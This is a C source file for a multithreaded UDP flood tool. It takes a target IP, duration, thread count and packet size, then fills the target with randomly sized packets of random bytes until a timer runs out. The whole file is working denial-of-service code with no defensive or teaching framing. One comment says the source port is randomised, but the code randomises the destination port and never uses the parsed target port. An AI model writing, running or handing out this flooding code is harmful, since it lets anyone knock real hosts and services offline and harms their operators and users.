#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>

volatile int keep_running = 1;

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int base_packet_size;
} attack_params;

void handle_signal(int signal) {
    keep_running = 0;
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) pthread_exit(NULL);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, params->target_ip, &server_addr.sin_addr);

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        // Randomize packet size: 50–100% of base size
        int packet_size = (rand() % (params->base_packet_size / 2)) + (params->base_packet_size / 2);
        message = (char *)malloc(packet_size);
        if (!message) break;

        for (int i = 0; i < packet_size; i++) {
            message[i] = rand() % 256;
        }

        // Random source port per send
        server_addr.sin_port = htons((rand() % 65535) + 1);

        sendto(sock, message, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        free(message);
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int total_threads = atoi(argv[4]);
    int base_packet_size = atoi(argv[5]);

    if (total_threads <= 0 || base_packet_size <= 0) {
        return EXIT_FAILURE;
    }

    signal(SIGINT, handle_signal);
    srand(time(NULL));

    pthread_t *threads = malloc(total_threads * sizeof(pthread_t));
    attack_params params;
    params.target_ip = target_ip;
    params.target_port = target_port;
    params.duration = duration;
    params.base_packet_size = base_packet_size;

    for (int i = 0; i < total_threads; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &params);
    }

    for (int i = 0; i < total_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    return 0;
}